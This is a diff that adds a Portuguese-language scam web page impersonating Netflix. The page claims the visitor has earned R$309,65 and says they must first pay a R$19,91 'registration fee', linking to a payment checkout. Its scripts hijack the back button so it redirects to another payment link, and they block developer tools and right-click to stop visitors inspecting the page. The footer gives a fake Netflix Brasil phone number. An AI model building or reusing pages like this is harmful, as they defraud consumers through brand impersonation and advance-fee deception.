@@ -1,0 +1,297 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Pay</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap" rel="stylesheet">
+    <style>
+        #netflixlogoapp{
+            width: 100px;
+            margin: 10px;
+        }
+        *{
+            margin: 0px;
+            font-family: "Poppins", sans-serif;
+            padding: 0px;
+        }
+        body{
+            background-color: black;
+        }
+        #barranetflix{
+            background: linear-gradient( black, rgba(255, 0, 0, 0));
+            display: flex;
+            justify-content: space-between;
+            margin: 10px;
+        }
+        #bannerprincipal{
+            background-image: url('images/banner.png') ;
+            background-position: center; /* Center the image */
+            background-repeat: no-repeat; /* Do not repeat the image */
+            background-size: cover;
+        }
+        #textoprincipal{
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-size: 27px;
+        }
+        #ganheassistindocaixa{
+            padding: 5px;
+            text-align: center;
+            font-size: 23px;
+            margin-bottom: 10px;
+            font-weight: 700;
+            margin-top: 10px;
+            background-color: rgb(211, 15, 15);
+            width: 40%;
+        }
+        #textodetalhelogin{
+            font-size: 15px;
+            padding: 20px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+        #inputtypetext{
+            border: 1px solid rgba(255, 255, 255, 0.411);
+            background-color: rgba(0, 0, 0, 0.63);
+            color: white;
+            width: 80%;
+            border-radius: 5px;
+            margin-top: 20px;
+            padding: 13px 10px;
+            font-weight: 700;
+        }
+        a{
+            text-decoration: none;
+        }
+        #botaoproximaetapa{
+            padding: 10px;
+            font-weight: 700;
+            width: 70%;
+            margin-top: 10px;
+            color: white;
+            border-radius: 5px;
+            font-size: 18px;
+            background-color: rgb(211, 15, 15);
+        }
+        #botaoproximaetapaa{
+            padding: 10px;
+            font-weight: 700;
+            width: 70%;
+            margin-top: 10px;
+            color: rgb(211, 15, 15);
+            border-radius: 5px;
+            font-size: 18px;
+            background-color: rgb(41, 3, 3);
+            border: 1px solid rgb(211, 15, 15);
+        }
+        #botaolucraretapa{
+            background: linear-gradient(rgba(0, 0, 0, 0), rgb(0, 0, 0));
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 0px 0px 20px 0px;
+            text-align: center;
+        }
+        #botaolucraretapaa{
+            display: flex;
+            justify-content: center;
+            margin-top: -90px;
+            align-items: center;
+            padding: 0px 0px 20px 0px;
+            text-align: center;
+        }
+        #informativo{
+            padding: 10px;
+            margin: 10px;
+            margin-top: 25px;
+            display: flex;
+            margin-left:  -150px;
+            justify-content: center;
+            align-items: center;
+            border-radius: 5px;
+            height: 200px;
+        }
+        #pipocanetflix{
+            width: 30px;
+        }
+        #dinheirologo{
+            width: 60px;
+        }
+        .tvnetflix{
+            width: 90%;
+        }
+        #tvnetflixaax{
+            width: 250px;
+        }
+        #tvnetflixapp{
+            width: 150px;
+            height: 150px;
+            position: relative;
+        }
+        #videomp4net{
+            width: 200px;
+            margin-left: 50px;
+            margin-top: 30px;
+        }
+        #informativo div:first-child {
+            width: 150px;
+            height: 150px;
+            position: relative;
+        }
+        #informativo div:last-child {
+            width: 150px;
+            height: 150px;
+            position: relative;
+            margin-top: -150px;
+            margin-left: 20px;
+        }
+        #textodetalhelogindd{
+            color: white;
+            padding: 30px;
+            font-size: 19px;
+            font-weight: 600;
+            margin-top: -35px;
+            text-align: center;
+        }
+        footer{
+            color: white;
+            background-color: rgb(19, 19, 19);
+            height: 120px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        #saldolead{
+            padding: 10px 15px;
+            background-color: rgba(255, 0, 0, 0.562);
+            border: 1px solid red;
+            height: 15px;
+            border-radius: 5px;
+            display: flex;
+            margin-top: 10px;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div id="bannerprincipal">
+        <div id="barranetflix">
+            <img src="images/netflix.png" id="netflixlogoapp">
+            <div id="saldolead">Saldo: R$ <b>309,65</b></div>
+        </div>
+        <div id="textoprincipal">
+            <div id="ganheassistindocaixa">ATENÇÃO</div>
+            <p id="textodetalhelogin">
+                Para receber seu lucro de R$ 309,65 basta realizar seu cadastro no botão abaixo e pagar uma pequena Taxa de Cadastro! no valor de R$19,91 <br><br>Mas fique tranquilo(a), este valor de R$19,91 irá retornar para sua conta junto com seu Saque de R$309,65 
+            </p>
+        </div>
+        <div id="botaolucraretapa">
+            <a href="https://checkout.pepper.com.br/?p=150457&o=192928" id="botaoproximaetapa">Pagar taxa e<br>receber meu saque</a>
+        </div>
+    </div>
+
+    <div id="informativo">
+        <div id="tvnetflixapp">
+            <div><img src="https://media.licdn.com/dms/image/D4D22AQGJS4zsotgd8g/feedshare-shrink_2048_1536/0/1701802613378?e=2147483647&amp;v=beta&amp;t=3qNn7SKjA_7L5Sul6Yv6vTRfO9UZ0GmqfYLDgAekptg" id="videomp4net"></div>
+            <div><img src="images/tv.png" id="tvnetflixaax"></div>
+        </div>
+    </div>
+    
+    <div id="botaolucraretapaa">
+        <a href="https://checkout.pepper.com.br/?p=150457&o=192928" id="botaoproximaetapaa">Pagar taxa e<br>receber meu saque</a>
+    </div>
+    <footer>
+        <p style="font-size: 15px;">Dúvidas? Ligue <u>0800 591 2876</u></p>
+        <p style="font-size: 15px;">NETFLIX BRASIL</p>
+    </footer>
+	  <script>
+    // Função para adicionar os parâmetros aos links
+    function adicionarParametrosAosLinks() {
+        const urlParams = new URLSearchParams(window.location.search);
+
+        const links = document.querySelectorAll('a');
+
+        links.forEach(link =>  {
+            const href = new URL(link.href);
+            urlParams.forEach((value, key) => {
+                href.searchParams.set(key, value);
+            });
+            link.href = href.toString();
+        });
+    }
+
+    // Chamar a função ao carregar a página
+    document.addEventListener('DOMContentLoaded', adicionarParametrosAosLinks);
+    <!-- Script Utms -->
+	 // BACK REDIRECT
+            var urlBackRedirect = 'https://go.tribopay.com/ngn4k'; // lembre-se de usar a url sem espaços
+            // não altere nada abaixo dessa linha
+            urlBackRedirect = urlBackRedirect = urlBackRedirect.trim() +
+            (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') +
+            document.location.search.replace('?', '').toString();
+            history.pushState({}, "", location.href);
+            history.pushState({}, "", location.href);
+            window.onpopstate = function () {
+                setTimeout(function () {
+                    location.href = urlBackRedirect;
+                }, 1);
+            };
+            // BACK REDIRECT
+
+
+            // MÁSCARA INPUT
+            jQuery(function($){
+                $("#codigoBarrasDigitado").mask("99     99     99     99");
+            });
+            // MÁSCARA INPUT
+        </script>   
+    
+<!-- Script Impedir f12-->
+    <script>
+    document.addEventListener("keydown", function (e) {
+        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) { // Prevent F12
+            e.preventDefault()
+        }
+    }, true);
+    document.addEventListener('contextmenu', function (e) {
+        e.preventDefault()
+    }, true);
+</script>
+    <!-- Script Impedir f12-->
+    
+    <!-- Script Utms -->
+<script>
+    // Função para adicionar os parâmetros ao action do formulário
+    function adicionarParametrosAoActionDoForm() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const form = document.getElementById('formCupom'); // Obtém o formulário pelo ID
+
+        // Verifica se o formulário existe
+        if (form) {
+            const action = new URL(form.action); // Obtém o action do formulário
+            urlParams.forEach((value, key) => {
+                action.searchParams.set(key, value);
+            });
+            form.action = action.toString(); // Define o novo action com os parâmetros adicionados
+        }
+    }
+
+    // Chamar a função ao carregar a página
+    document.addEventListener('DOMContentLoaded', adicionarParametrosAoActionDoForm);
+</script>
+<!-- Script Utms -->
+
+</body></html>
+
+
+</body></html>
+
+</body></html>
